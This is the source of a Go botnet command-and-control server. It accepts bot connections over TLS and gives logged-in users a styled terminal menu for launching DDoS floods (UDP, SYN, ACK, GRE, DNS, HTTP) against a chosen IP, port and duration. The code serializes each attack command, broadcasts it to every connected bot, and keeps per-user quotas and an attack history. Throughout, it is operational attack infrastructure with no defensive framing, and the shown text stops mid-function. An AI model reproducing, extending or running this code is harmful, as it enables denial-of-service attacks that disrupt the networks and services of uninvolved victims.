package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

const (
	USERS_FILE       = "data/json/users.json"
	USER_SERVER_IP   = "192.168.0.216"
	BOT_SERVER_IP    = "192.168.0.216"
	BOT_SERVER_PORT  = "7002"
	USER_SERVER_PORT = "420"
	CERT_FILE        = "data/certs/server.crt"
	KEY_FILE         = "data/certs/server.key"
	TERM_WIDTH       = 82
	TERM_HEIGHT      = 26
)

var (
	botConns     []*tls.Conn
	botConnsLock sync.RWMutex
)

var (
	semaphore   = make(chan struct{}, 1000)
	clientsLock sync.RWMutex
)

type client struct {
	conn         net.Conn
	user         User
	sessionToken string // Add this field
	sessionID    string // Add this field
}

type Attack struct { // Capitalize to export
	method   string
	ip       string
	port     string
	duration time.Duration
	start    time.Time
	user     string
}

var (
	ongoingAttacks    = make(map[net.Conn]Attack)
	ongoingAPIAttacks = make(map[string]Attack)
	apiAttackLock     sync.Mutex
	attackHistory     []Attack
	clients           = []*client{}
	attackLock        sync.Mutex
	historyLock       sync.Mutex
	botCountLock      sync.Mutex
	botCount          int
)

func initializeComponents() error {
	if err := initSessionManagement(); err != nil {
		return fmt.Errorf("session management: %w", err)
	}

	if err := InitLogger("data/logs"); err != nil {
		return fmt.Errorf("logger: %w", err)
	}

	if err := LoadRBACConfig(); err != nil {
		return fmt.Errorf("RBAC: %w", err)
	}

	InitRateLimiter()
	return nil
}

func main() {
	os.Setenv("LANG", "en_US.UTF-8")

	// Set up signal handling for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM, syscall.SIGQUIT)

	// Goroutine to handle graceful shutdown
	go func() {
		sig := <-sigChan
		fmt.Printf("\nReceived signal: %v. Shutting down gracefully...\n", sig)

		// Close all connections in the pool
		connectionPool.CloseAll()

		// Close the global logger if it exists
		if globalLogger != nil {
			globalLogger.Close()
		}

		// Close API server if it's running
		if apiServer != nil && apiServer.started {
			// Create a simple shutdown context
			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()

			// Gracefully shutdown the HTTP server
			if err := apiServer.server.Shutdown(ctx); err != nil {
				fmt.Printf("Error shutting down API server: %v\n", err)
			}
			apiServer.started = false
			fmt.Println("[API] Server stopped")
		}

		fmt.Println("Shutdown complete.")
		os.Exit(0)
	}()

	if _, err := os.ReadFile("data/json/users.json"); err != nil {
		// File doesn't exist or can't be read, continue without users file
	}
	cert, err := tls.LoadX509KeyPair(CERT_FILE, KEY_FILE)
	if err != nil {
		fmt.Println("Error loading TLS certificates:", err)
		return
	}

	if err := initSessionManagement(); err != nil {
		fmt.Printf("Error initializing session management: %v\n", err)
		return
	}

	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS13,
		CipherSuites: []uint16{
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_AES_128_GCM_SHA256,
		},
		CurvePreferences:         []tls.CurveID{tls.X25519, tls.CurveP256},
		PreferServerCipherSuites: true,
		SessionTicketsDisabled:   true,
	}
	if err := InitLogger("data/logs"); err != nil {
		fmt.Printf("Error initializing logger: %v\n", err)
		return
	}
	defer globalLogger.Close()
	if err := LoadRBACConfig(); err != nil {
		fmt.Printf("Error loading RBAC config: %v\n", err)
		return
	}

	secretManager := NewSecretManager()
	secretManager.LoadSecretsFromEnv("CNC_")
	InitRateLimiter()
	go updateTitle()
	go ScheduleDiagnosticRequests()
	go CleanupSessions()
	go StartHeartbeatMonitor()
	go CleanupQuotas()
	go CleanupAuthAttempts()
	go CleanupConnectionCounts()
	go initializeComponents()
	connectionPool.StartCleanupRoutine(1 * time.Minute)

	apiServer = NewAPIServer("8443")
	if err := apiServer.Start(); err != nil {
		fmt.Printf("Error starting API server: %v\n", err)
	}

	// Ensure connection pool is closed on normal exit too
	defer connectionPool.CloseAll()

	fmt.Println("[☾☼☽] User server started on", USER_SERVER_IP+":"+USER_SERVER_PORT)
	userListener, err := tls.Listen("tcp", USER_SERVER_IP+":"+USER_SERVER_PORT, tlsConfig)
	if err != nil {
		fmt.Println("Error starting user server:", err)
		return
	}
	defer userListener.Close()

	fmt.Println("[☾☼☽] Bot server started on", BOT_SERVER_IP+":"+BOT_SERVER_PORT)
	botListener, err := tls.Listen("tcp", BOT_SERVER_IP+":"+BOT_SERVER_PORT, tlsConfig)
	if err != nil {
		fmt.Println("Error starting bot server:", err)
		return
	}
	defer botListener.Close()

	// Use WaitGroup to manage goroutines
	var wg sync.WaitGroup
	stopChan := make(chan struct{})

	// User connection handler goroutine
	wg.Add(1)
	go func() {
		defer wg.Done()
		for {
			select {
			case <-stopChan:
				return
			default:
				conn, err := userListener.Accept()
				if err != nil {
					select {
					case <-stopChan:
						return
					default:
						fmt.Println("Error accepting user connection:", err)
						continue
					}
				}
				fmt.Println("[☾☼☽] [User] Connected To Login Port:", conn.RemoteAddr())
				go handleRequest(conn.(*tls.Conn))
			}
		}
	}()

	// Bot connection handler goroutine
	wg.Add(1)
	go func() {
		defer wg.Done()
		for {
			select {
			case <-stopChan:
				return
			default:
				conn, err := botListener.Accept()
				if err != nil {
					select {
					case <-stopChan:
						return
					default:
						fmt.Println("Error accepting bot connection:", err)
						continue
					}
				}
				tlsConn := conn.(*tls.Conn)

				if err := connectionPool.Put(tlsConn.RemoteAddr().String(), tlsConn); err != nil {
					fmt.Printf("Connection pool full, rejecting bot: %v\n", err)
					tlsConn.Close()
					continue
				}

				fmt.Println("[☾☼☽] Bot connected From", conn.RemoteAddr())
				go handleBotConnection(tlsConn)
			}
		}
	}()

	// Wait for shutdown signal
	<-sigChan
	fmt.Println("\nShutting down servers...")

	// Signal all goroutines to stop
	close(stopChan)

	// Close listeners to unblock Accept() calls
	userListener.Close()
	botListener.Close()

	// Wait for all goroutines to finish
	wg.Wait()

	// Final cleanup
	connectionPool.CloseAll()
	if globalLogger != nil {
		globalLogger.Close()
	}

	fmt.Println("Server shutdown completed.")
}

func removeBotConn(conn *tls.Conn) {
	botConnsLock.Lock()
	defer botConnsLock.Unlock()
	for i, c := range botConns {
		if c == conn {
			botConns = append(botConns[:i], botConns[i+1:]...)
			break
		}
	}
}

func updateTitle() {
	spinChars := []rune{'∴', '∵'}
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		clientsLock.RLock()
		currentClients := make([]*client, len(clients))
		copy(currentClients, clients)
		clientsLock.RUnlock()

		for _, c := range currentClients {
			spinIndex := time.Now().Second() % len(spinChars)
			attackCount := len(ongoingAttacks) + len(ongoingAPIAttacks)
			title := fmt.Sprintf("    [%c]  Servers: %d | Attacks: %d |  ☾☼☽  | User: %s [%c]",
				spinChars[spinIndex], getBotCount(), attackCount, c.user.Username, spinChars[spinIndex])
			setTitle(c.conn, title)
		}
	}
}

func authUser(conn net.Conn) (bool, *client) {
	clientIP := conn.RemoteAddr().(*net.TCPAddr).IP.String()

	if !CheckAuthRateLimit(clientIP) {
		conn.Write([]byte("\033[0;31m[!] Too many failed attempts. Please try again later.\033[0m\r\n"))
		return false, nil
	}

	drawHeader := func() {
		conn.Write([]byte("\033[2J\033[H")) // Clear screen

		// Grayscale colors range: 232 (black) → 255 (white)
		grayscale := []int{232, 234, 236, 238, 240, 242, 244, 246, 248, 250, 252, 254, 255}

		lines := []string{
			"╭══════════════════════════════════════════════════════════════════════════════╮",
			"║       ██████   ██████                    ███████████   ███                   ║",
			"║       ▒▒██████ ██████                    ▒▒███▒▒▒▒▒███ ▒▒▒                   ║",
			"║        ▒███▒█████▒███   ██████    ███████ ▒███    ▒███ ████   ██████         ║",
			"║        ▒███▒▒███ ▒███  ▒▒▒▒▒███  ███▒▒███ ▒██████████ ▒▒███  ███▒▒███        ║",
			"║        ▒███ ▒▒▒  ▒███   ███████ ▒███ ▒███ ▒███▒▒▒▒▒▒   ▒███ ▒███████         ║",
			"║        ▒███      ▒███  ███▒▒███ ▒███ ▒███ ▒███         ▒███ ▒███▒▒▒          ║",
			"║        █████     █████▒▒████████▒▒███████ █████        █████▒▒██████         ║",
			"║       ▒▒▒▒▒     ▒▒▒▒▒  ▒▒▒▒▒▒▒▒  ▒▒▒▒▒███▒▒▒▒▒        ▒▒▒▒▒  ▒▒▒▒▒▒          ║",
			"║                                 ███ ▒███                                     ║",
			"║                                ▒▒██████                                      ║",
			"║                                  ▒▒▒▒▒▒                                      ║",
			"╰══════════════════════════════════════════════════════════════════════════════╯",
		}

		// Assign each line a grayscale color progressively
		for i, line := range lines {
			color := grayscale[i*len(grayscale)/len(lines)] // map line to grayscale
			conn.Write([]byte(fmt.Sprintf("\x1b[38;5;%dm%s\033[0m\n", color, line)))
		}
	}
	drawHeader()

	// Draw header once before the loop
	for i := 0; i < 3; i++ {

		// Auth decoration
		conn.Write([]byte("\n"))
		conn.Write([]byte("                       \033[38;5;109m► Auth\033[38;5;146ment\033[38;5;182micat\033[38;5;218mion --- \033[38;5;196mReq\033[38;5;161muir\033[38;5;89med\033[0m\n"))

		// Username prompt
		conn.Write([]byte("\033[38;5;245m                               ☉ Username\033[38;5;255m: \033[0m"))
		username, _ := getFromConn(conn)

		// Password prompt
		conn.Write([]byte("\033[38;5;245m                               ☉ Password\033[38;5;255m: \033[0m"))
		password, _ := getFromConn(conn)
		conn.Write([]byte("\033[0m"))

		if exists, user := AuthUser(username, password); exists {
			ResetAuthAttempts(clientIP)

			// Create JWT session
			session, token, err := CreateSession(*user, clientIP, "terminal")
			if err != nil {
				writeError(conn, "Session creation failed: "+err.Error())
				continue
			}

			if !sessions.Set(session.ID, session) {
				writeError(conn, "Too many active sessions")
				continue
			}

			LoadingAnimation.PlayCentered(conn, 2*time.Second, "Authenticating...\r")
			SuccessAnimation.PlayCentered(conn, 1*time.Second, "      Authentication Successful!!!\r")
			gifs("crow.tfx", conn)

			conn.Write([]byte("\033[2J\033[H\033[3J\033[H\033[2J\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))

			userCopy := User{
				Username:  user.Username,
				Password:  user.Password,
				Expire:    user.Expire,
				Level:     user.Level,
				APIToken:  user.APIToken,
				APISecret: user.APISecret,
			}

			loggedClient := &client{
				conn:         conn,
				user:         userCopy,
				sessionToken: token,
				sessionID:    session.ID,
			}

			clientsLock.Lock()
			clients = append(clients, loggedClient)
			clientsLock.Unlock()
			return true, loggedClient
		}

		LogAuth(username, clientIP, false)

		// Show invalid credentials immediately
		remaining := 2 - i
		conn.Write([]byte("\033[2J\033[H"))
		conn.Write([]byte("\033[3J\033[H\033[2J"))
		conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
		conn.Write([]byte(fmt.Sprintf("\033[38;5;196m[!] Invalid credentials. %d attempts remaining.\033[0m\n\n", remaining)))

		if i == 2 {
			conn.Write([]byte("\033[2J\033[H"))
			conn.Write([]byte("\033[3J\033[H\033[2J"))
			conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
			conn.Write([]byte("\033[0;31m[!] Too many failed attempts. Please try again later.\033[0m\n"))
			return false, nil
		}
	}

	conn.Close()
	return false, nil

}

func getFromConn(conn net.Conn) (string, error) {
	readString, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		return readString, err
	}
	readString = strings.TrimSuffix(readString, "\n")
	readString = strings.TrimSuffix(readString, "\r")
	return readString, nil
}

func sendToBots(cmdPacket CommandPacket) {
	method := strings.TrimRight(string(cmdPacket.Method[:]), "\x00")
	if !validateCommand(method) {
		LogSystem("ERROR", "INVALID_COMMAND", fmt.Sprintf("Attempted to send invalid command: %s", method))
		return
	}

	// Serialize the command packet
	cmdData := make([]byte, 42)
	copy(cmdData[0:16], cmdPacket.Method[:])
	copy(cmdData[16:20], cmdPacket.TargetIP[:])
	binary.BigEndian.PutUint16(cmdData[20:22], cmdPacket.Port)
	binary.BigEndian.PutUint32(cmdData[22:26], cmdPacket.Duration)
	copy(cmdData[26:42], cmdPacket.Reserved[:])

	packet := CreatePacket(PacketTypeCommand, cmdData)
	serializedPacket, err := SerializePacket(packet)
	if err != nil {
		fmt.Printf("Error serializing packet: %v\n", err)
		return
	}

	// Use connection pool to send to all bots
	connectionPool.mutex.RLock()
	defer connectionPool.mutex.RUnlock()

	for addr, pooledConn := range connectionPool.pool {
		if pooledConn.conn != nil {
			_, err := pooledConn.conn.Write(serializedPacket)
			if err != nil {
				fmt.Printf("Error sending to bot %s: %v\n", addr, err)
				connectionPool.Remove(addr)
			}
		}
	}
}

func Ping(conn *tls.Conn, stopPing <-chan struct{}) {
	ticker := time.NewTicker(30 * time.Second) // Reduced frequency to match heartbeat
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			heartbeat := CreatePacket(PacketTypeHeartbeat, []byte{})
			if err := SendPacket(conn, heartbeat); err != nil {
				fmt.Printf("Error sending heartbeat to bot %s: %v\n", conn.RemoteAddr(), err)
				return
			}

		case <-stopPing:
			return
		}
	}
}

func handleRequest(conn *tls.Conn) {
	clientIP := conn.RemoteAddr().(*net.TCPAddr).IP.String()

	// Rate limiting
	if allowed, remaining := CheckConnectionRateLimit(clientIP); !allowed {
		conn.Write([]byte(fmt.Sprintf("Too many connections. Try again in %v\r\n", remaining)))
		conn.Close()
		return
	}

	if !CheckAuthRateLimit(clientIP) {
		conn.Write([]byte("Too many authentication attempts. Please try again later.\r\n"))
		conn.Close()
		return
	}

	if !CheckConnectionLimit(clientIP) {
		conn.Write([]byte("Too many connections from your IP. Please try again later.\r\n"))
		conn.Close()
		return
	}

	defer ReleaseConnection(clientIP)
	connectionLimiter <- struct{}{}
	defer func() { <-connectionLimiter }()

	conn.Write([]byte("\033[8;24;80t"))
	semaphore <- struct{}{}
	defer func() { <-semaphore }()
	conn.Write([]byte("\033%G"))
	conn.Write([]byte(getConsoleTitleAnsi("☾☼☽")))
	readString, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		return
	}
	if strings.HasPrefix(readString, "PONG") {
		for {
			_, err := bufio.NewReader(conn).ReadString('\v')
			if err != nil {
				return
			}
		}
	}
	conn.Write([]byte("\033[2J\033[H"))
	conn.Write([]byte("\033[3J\033[H\033[2J"))
	conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
	if strings.HasPrefix(readString, "loginforme") {
		if authed, client := authUser(conn); authed {
			conn.Write([]byte("\033[0m\r\n"))
			conn.Write([]byte("\033[0m\r\n"))
			conn.Write([]byte("\033[0m\r\n"))
			conn.Write([]byte("\033[0m\r\n"))
			conn.Write([]byte("\033[0m\r\n"))
			conn.Write([]byte("\033[0m\r\n"))
			conn.Write([]byte("\033[0m\r                           \033[38;5;15m\033[38;5;118m[x] Authentication Successful\n"))
			conn.Write([]byte("\033[0m\r\n"))
			conn.Write([]byte("\033[0m\r\n"))
			conn.Write([]byte("\033[0m\r\n"))

			time.Sleep(400 * time.Millisecond)
			conn.Write([]byte("\033[2J\033[H"))
			conn.Write([]byte("\033[3J\033[H\033[2J"))
			conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
			conn.Write([]byte("\033[0m\r\n"))
			conn.Write([]byte("\033[0m\r\n"))
			conn.Write([]byte("\033[0m\r\n"))
			conn.Write([]byte("\r\n"))
			conn.Write([]byte("\033[2J\033[H"))
			conn.Write([]byte("\033[3J\033[H\033[2J"))
			conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
			conn.Write([]byte("\033[2J\033[H"))
			conn.Write([]byte("\r\n"))
			conn.Write([]byte("\r\n"))
			FadeText(fmt.Sprintf("\033[0mWelcome %s! Type 'help' for commands.", client.user.Username), conn)
			conn.Write([]byte("\r\n"))
			conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
			conn.Write([]byte("\x1b[38;5;231m║                § \x1b[38;5;51mUser Menu\x1b[38;5;231m §                  ║ ●━━━━●━━━━●━━━●━━━●━━━●━━━━● ║\n\r"))
			conn.Write([]byte("\x1b[38;5;231m╠════════════════════╦══════════════════════════╢  │    │    │    │    │    │  ║\n\r"))
			conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;41mBasic Commands   \x1b[38;5;231m║  \x1b[38;5;41mOverview + Description  \x1b[38;5;231m║░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║\n\r"))
			conn.Write([]byte("\x1b[38;5;231m╠════════════════════╬══════════════════════════╬══════════════════════════════╣\n\r"))
			conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. bots          \x1b[38;5;231m║ Manage connected bots    ║ ╔══════════════════════════╗ ║\n\r"))
			conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. clear         \x1b[38;5;231m║ Clear the screen         ║ ║ L7: HTTP/HTTPS/TLS/SSL   ║ ║\n\r"))
			conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. help          \x1b[38;5;231m║ Show this help menu      ║ ║ L6: COMPRESSION/ENCRYPT  ║ ║\n\r"))
			conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. methods       \x1b[38;5;231m║ Show attack methods      ║ ║ L5: SESSION/RPC/NETBIOS  ║ ║\n\r"))
			conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. ongoing       \x1b[38;5;231m║ List ongoing attacks     ║ ║ L4: TCP/UDP/SCTP/PORTS   ║ ║\n\r"))
			conn.Write([]byte("\x1b[38;5;231m╠════════════════════╩══════════════════════════╢ ║ L3: IP/ICMP/ARP/ROUTING  ║ ║\n\r"))
			conn.Write([]byte("\x1b[38;5;231m║                § \x1b[38;5;51mAttack Menu\x1b[38;5;231m §                ║ ╚══════════════════════════╝ ║\n\r"))
			conn.Write([]byte("\x1b[38;5;231m╠════════════════════╦══════════════════════════╬══════════════════════════════╢\n\r"))
			conn.Write([]byte("\x1b[38;5;231m║\x1b[38;5;50m◉ Attack Commands ◉\x1b[38;5;231m ║  \x1b[38;5;50mOverview + Description  \x1b[38;5;231m║ ╔══════════════════════════╗ ║\n\r"))
			conn.Write([]byte("\x1b[38;5;231m╠════════════════════╬══════════════════════════║ ║ [1][2][3][4][5][6][7][8] ║ ║\n\r"))
			conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. allattacks    \x1b[38;5;231m║ Show all attacks         ║ ║  ●  ●  ○  ●  ○  ●  ○  ●  ║ ║\n\r"))
			conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃. stopattack    \x1b[38;5;231m║ Stop a running attack    ║ ║      24-PORT SWITCH      ║ ║\n\r"))
			conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪. attackhistory \x1b[38;5;231m║ View attack history      ║ ╚══════════════════════════╝ ║\n\r"))
			conn.Write([]byte("\x1b[38;5;231m╠════════════════════╩═════════════════╦════════╩══════════════════════════════╣\n\r"))
			conn.Write([]byte("\x1b[38;5;231m║  \x1b[38;5;45mEg.. !Method IP Port Duration ⚑ \x1b[38;5;231m    ║          ⚔ Attack Example ⚔           ║\n\r"))
			conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════╩═══════════════════════════════════════╯\n\r"))

			for {

				conn.Write([]byte("\n\r\033[38;5;146m[\033[38;5;161mPro\033[38;5;89mmpt\033[38;5;146m]\033[38;5;82m► \033[0m"))

				readString, err := bufio.NewReader(conn).ReadString('\n')
				if err != nil {
					if err == io.EOF {
						return
					}
					fmt.Printf("Error reading input: %v\n", err)
					conn.Close()
					return
				}
				readString = strings.TrimSuffix(readString, "\r\n")
				readString = strings.TrimSuffix(readString, "\n")

				parts := strings.Fields(readString)
				if len(parts) < 1 {
					continue
				}
				command := parts[0]
				switch strings.ToLower(command) {
				case "gif", "gifs":
					conn.Write([]byte("\033[2J\033[H"))
					conn.Write([]byte("\033[3J\033[H\033[2J"))
					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
					gifCommandHandler(parts, conn)
				case "!udpflood", "!udpsmart", "!tcpflood", "!synflood", "!ackflood", "!greflood", "!dns", "!http":
					conn.Write([]byte("\033[2J\033[H"))
					conn.Write([]byte("\033[3J\033[H\033[2J"))
					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
					if !client.user.CanUseMethod(command) {
						writeError(conn, "Insufficient permissions for this method")
						continue
					}
					if len(parts) < 4 {
						writeError(conn, "Usage: method ip port duration")
						continue
					}
					method := parts[0]
					ip := parts[1]
					port := parts[2]
					duration := parts[3]
					if !ValidateIP(ip) {
						writeError(conn, "Invalid IP address")
						LogInputValidation(conn.RemoteAddr().String(), "IP", ip)
						continue
					}
					if !ValidatePort(port) {
						writeError(conn, "Invalid port number")
						LogInputValidation(conn.RemoteAddr().String(), "PORT", port)
						continue
					}
					dur, err := time.ParseDuration(duration + "s")
					if err != nil || dur < 1*time.Second || dur > 3600*time.Second {
						writeError(conn, "Invalid duration (1-3600 seconds)")
						LogInputValidation(conn.RemoteAddr().String(), "DURATION", duration)
						continue
					}
					if canLaunch, reason := CanLaunchAttack(client.user.Username, dur); !canLaunch {
						writeError(conn, reason)
						LogQuotaExceeded(client.user.Username, "attack")
						continue
					}
					AttackAnimation.Play(conn, 2*time.Second, "Launching Attack...")

					// Attack Launch Success Display
					conn.Write([]byte("\r\n"))
					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║             § \x1b[38;5;51mAttack Launched Successfully!\x1b[38;5;231m §           ║   ┌────────────────────┐   ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣   │    ATTACK DEPLOYED   │   ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Attack Parameters Confirmed\x1b[38;5;231m                 ║   │      ACTIVE        │   ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣   └────────────────────┘   ║\n\r"))
					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Method:    \x1b[38;5;82m%-30s\x1b[38;5;231m   ║   ░░░░░░░░░░░░░░░░░░░░░░   ║\r\n", method)))
					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Target:    \x1b[38;5;82m%-15s:%-5s\x1b[38;5;231m         ║   ────────────────────   ║\r\n", ip, port)))
					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Duration:  \x1b[38;5;82m%-30s\x1b[38;5;231m   ║   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   ║\r\n", duration+" seconds")))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╬══════════════════════════════╣\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Network Status\x1b[38;5;231m                               ║   ┌────────────────────┐   ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣   │   BOTS ENGAGED     │   ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Status:    \x1b[38;5;82mATTACK INITIATED\x1b[38;5;231m                   ║   │    FLOODING...    │   ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Bots:      \x1b[38;5;82mSENDING PACKETS\x1b[38;5;231m                   ║   └────────────────────┘   ║\n\r"))
					conn.Write([]byte("\x11b[38;5;231m╰═══════════════════════════════════════════════╩══════════════════════════════╯\r\n"))

					attackLock.Lock()
					ongoingAttacks[conn] = Attack{
						method:   method,
						ip:       ip,
						port:     port,
						duration: dur,
						start:    time.Now(),
						user:     client.user.Username,
					}
					attackLock.Unlock()
					historyLock.Lock()
					attackHistory = append(attackHistory, ongoingAttacks[conn])
					historyLock.Unlock()
					go func(conn net.Conn, attack Attack) {
						// Remove progress bar, just wait for duration
						time.Sleep(attack.duration)
						attackLock.Lock()
						delete(ongoingAttacks, conn)
						attackLock.Unlock()
						SuccessAnimation.Play(conn, 1*time.Second, "Attack completed successfully!")
					}(conn, ongoingAttacks[conn])
					var cmdPacket CommandPacket
					copy(cmdPacket.Method[:], method)
					ipBytes := net.ParseIP(ip).To4()
					if ipBytes != nil {
						copy(cmdPacket.TargetIP[:], ipBytes)
					}
					portInt, _ := strconv.Atoi(port)
					cmdPacket.Port = uint16(portInt)
					durInt, _ := strconv.Atoi(duration)
					cmdPacket.Duration = uint32(durInt)
					sendToBots(cmdPacket)

				case "ongoing":
					conn.Write([]byte("\033[2J\033[H"))
					conn.Write([]byte("\033[3J\033[H\033[2J"))
					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
					conn.Write([]byte("\r\n"))
					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║               § \x1b[38;5;51mCurrent Attack Status\x1b[38;5;231m §            ║ ╔══════════════════════════╗ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣ ║      LIVE SESSION      ║ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║ \x11b[38;5;45m● Active Attack Monitor\x1b[38;5;231m                      ║ ║   ┌─┐ ┌─┐ ┌─┐ ┌─┐ ┌─┐   ║ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╬ ║   │ │ │ │ │ │ │ │ │   ║ ║\n\r"))

					attackLock.Lock()
					if attack, exists := ongoingAttacks[conn]; exists {
						remaining := time.Until(attack.start.Add(attack.duration))
						if remaining > 0 {
							conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Status:    \x1b[38;5;82mATTACK IN PROGRESS\x1b[38;5;231m              ║ ║   └─┘ └─┘ └─┘ └─┘ └─┘   ║ ║\n\r"))
							conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╬ ╚══════════════════════════╝ ║\n\r"))
							conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Method:    \x1b[38;5;82m%-30s\x1b[38;5;231m   ║                            ║\r\n", attack.method)))
							conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Target:    \x1b[38;5;82m%-15s:%-5s\x1b[38;5;231m         ║                            ║\r\n", attack.ip, attack.port)))
							conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Remaining: \x1b[38;5;82m%-26d\x1b[38;5;231m   ║                            ║\r\n", int(remaining.Seconds()))))
							conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Elapsed:   \x1b[38;5;82m%-26d\x1b[38;5;231m   ║                            ║\r\n", int(time.Since(attack.start).Seconds()))))
							conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╩══════════════════════════════╣\n\r"))
							conn.Write([]byte("\x1b[38;5;231m║              \x1b[38;5;51mAttack is actively running...\x1b[38;5;231m              ║\n\r"))
						} else {
							delete(ongoingAttacks, conn)
							conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Status:    \x1b[38;5;196mATTACK COMPLETED\x1b[38;5;231m                 ║ ╔══════════════════════════╗ ║\n\r"))
							conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Message:   \x1b[38;5;196mSession cleaned up\x1b[38;5;231m                 ║ ║     FINISHED        ║ ║\n\r"))
							conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╬ ╚══════════════════════════╝ ║\n\r"))
						}
					} else {
						conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Status:    \x1b[38;5;196mNO ACTIVE ATTACK\x1b[38;5;231m                  ║ ░░░░░░░░░░░░░░░░░░░░░░ ║\n\r"))
						conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Message:   \x1b[38;5;196mNo ongoing attack found\x1b[38;5;231m             ║ ──────────────────── ║\n\r"))
						conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╩══════════════════════════════╣\n\r"))
					}
					attackLock.Unlock()
					conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════════════════════════════════════════════╯\n\r"))
				case "allattacks":
					conn.Write([]byte("\033[2J\033[H"))
					conn.Write([]byte("\033[3J\033[H\033[2J"))
					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
					conn.Write([]byte("\r\n"))
					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
					conn.Write([]byte("\x1b[38;5;231m║              § \x1b[38;5;51mActive Attack Monitor\x1b[38;5;231m §        ║ ╔══════════════════════════╗ ║\n\r"))
					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣ ║       LIVE ATTACKS       ║ ║\n\r"))
